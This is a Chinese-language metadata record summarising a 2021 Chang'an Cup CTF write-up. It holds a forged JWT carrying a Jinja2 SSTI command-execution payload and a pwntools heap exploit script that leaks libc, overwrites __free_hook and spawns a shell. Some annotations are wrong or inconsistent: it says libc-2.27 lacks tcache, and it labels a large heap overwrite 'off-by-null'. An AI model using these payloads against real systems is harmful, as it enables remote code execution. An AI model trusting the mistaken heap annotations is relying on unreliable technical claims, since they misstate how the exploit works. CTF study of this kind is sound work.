---
title: 长安杯-WriteUp
contest: 长安杯
year: 2021
difficulty: medium
vuln_type: web_unknown
tags: [Web-JWT-SSTI注入,Heap-整数溢出-负数size,off-by-null,unsorted bin,libc-2.27-Pwn,Reverse,ChaMd5-Venom]
attack_chain: Web: JWT user='{{url_for.__globals__.os.popen(request.args.cmd).read()}}' passwd=123 role=admin uid=空|JWT签名伪造 HS256 secret=key|Pwn: add(0,0x28)+add(1,0x400)+add(2,0x68)+add(3,0x68)+add(4,0x50,/bin/sh)+sh.sendline('1') sendline(0) sendline('-1') 整数溢出+edit(0,0x10000, p64(0)*5+p64(0x411+0x70*2))+delete(1)+add(1,0x400)+show(2)泄libc+add(1,0x90, 0x68*'\x00'+p64(0x71)+p64(__free_hook))+add(2,0x60)+add(2,0x60,p64(system))+delete(4)→system('/bin/sh')
key_payload: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoie3t1cmxfZm9yLl9fZ2xvYmFsc19fLm9zLnBvcGVuKHJlcXVlc3QuYXJncy5jbWQpLnJlYWQoKX19IiwicGFzc3dkIjoiMTIzIiwicm9sZSI6ImFkbWluIiwidWlkIjoiIn0.KWHbwpGOiRZvRZxbdibiqK5C636QHuVnhUHVz_CDYD0|add(0,0x28,'a') add(1,0x400,'a') add(2,0x68,'a') add(3,0x68,'a') add(4,0x50,'/bin/sh\x00') sendline('1') sendline(0) sendline('-1')|edit(0,0x10000, p64(0)*5+p64(0x411+0x70*2)) delete(1) add(1,0x400) show(2) libc.address=u64(recvuntil('\x7f')[-6:].ljust(8,'\x00'))-96-__malloc_hook-0x10|add(1,0x90, 0x68*'\x00'+p64(0x71)+p64(__free_hook)) add(2,0x60,'a') add(2,0x60,p64(system)) delete(4)
one_liner: 长安杯2021:Web JWT+SSTI用户字段URL_for.__globals__.os.popen(request.args.cmd)|Pwn菜单add/edit/delete/show+整数溢出(负size)+off-by-null+libc-2.27+unsorted bin泄+__free_hook覆盖+system('/bin/sh')
lesson: 1) JWT用户字段SSTI:HS256签名可逆向secret,user='{{url_for.__globals__.os.popen(request.args.cmd).read()}}'; 2) 整数溢出触发off-by:sendline('-1')→ size=0xFFFFFFFF+后续edit(0,0x10000) 任意堆写; 3) unsorted bin leak:0x400 chunk进入unsorted bin后fd指向main_arena; 4) libc-2.27无tcache:__free_hook直接覆盖; 5) 大小chunk混合:0x28+0x400+0x68*3+0x50(/bin/sh)
quality: high
---

## 备注

原文(https://www.ctfiot.com/1069.html)2021年10月长安杯,ChaMd5 Venom战队WP,末尾招新广告。

### 题目详情

**Web-JWT+SSTI**
- JWT原文:`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoie3t1cmxfZm9yLl9fZ2xvYmFsc19fLm9zLnBvcGVuKHJlcXVlc3QuYXJncy5jbWQpLnJlYWQoKX19IiwicGFzc3dkIjoiMTIzIiwicm9sZSI6ImFkbWluIiwidWlkIjoiIn0.KWHbwpGOiRZvRZxbdibiqK5C636QHuVnhUHVz_CDYD0`
- 解析:
  - `user` = `{{url_for.__globals__.os.popen(request.args.cmd).read()}}`
  - `passwd` = `123`
  - `role` = `admin`
  - `uid` = 空
- HS256签名,secret key可逆向

**Pwn-Heap整数溢出**
```python
add(0, 0x28, 'a')        # 0x30 chunk
add(1, 0x400, 'a')       # 0x410 chunk
add(2, 0x68, 'a')        # 0x70 chunk
add(3, 0x68, 'a')        # 0x70 chunk
add(4, 0x50, '/bin/sh\x00')  # 0x60 chunk (含 /bin/sh)
sh.recvuntil('>>')
sh.sendline('1')
sh.sendline(0)
sh.sendline('-1')         # 整数溢出,size=0xFFFFFFFF
edit(0, 0x10000, p64(0)*5 + p64(0x411+0x70*2))  # off-by-null写0x411→0x410
delete(1)                 # 0x410 进 unsorted bin
add(1, 0x400, 'a')        # 重新申请
show(2)                   # 0x70 chunk fd 指向 main_arena
libc.address = u64(sh.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 96 - libc.sym['__malloc_hook'] - 0x10
delete(3)
add(1, 0x90, 0x68*'\x00' + p64(0x71) + p64(libc.sym['__free_hook']))
add(2, 0x60, 'a')
add(2, 0x60, p64(libc.sym['system']))
delete(4)                  # free(/bin/sh) → system('/bin/sh')
sh.interactive()
```

## 评级

- **quality: high** — Web JWT+SSTI注入+Pwn Heap整数溢出+off-by-null+unsorted bin泄+libc-2.27全套,ChaMd5 Venom战队WP
- **vuln_type: web_unknown** — 主分类Web
- 实战价值:JWT用户字段SSTI+负size触发整数溢出是CTF高阶套路
